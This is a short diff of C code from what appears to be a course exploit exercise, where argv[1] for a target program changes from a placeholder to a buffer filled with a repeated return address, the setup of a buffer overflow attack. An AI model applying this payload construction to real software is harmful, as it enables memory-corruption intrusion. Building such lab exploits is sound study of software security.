@@ -36,7 +36,7 @@ int main(void)
   char *result2 = repeat(address, 38);
   strcat(result, result2);
   args[0] = TARGET;
-  args[1] = "student"; 
+  args[1] = result; 
   args[2] = NULL;
   
   env[0] = NULL;
